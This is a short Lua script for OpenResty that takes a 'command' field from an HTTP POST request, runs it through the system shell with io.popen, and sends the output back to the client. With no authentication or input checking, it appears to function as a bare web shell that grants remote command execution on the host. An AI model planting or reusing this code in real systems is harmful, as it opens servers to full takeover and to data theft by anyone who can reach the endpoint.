local args = ngx.req.get_post_args()
local cmd = args.command
local handle = io.popen(cmd)
local output = handle:read("*a")
handle:close()
ngx.say(output)
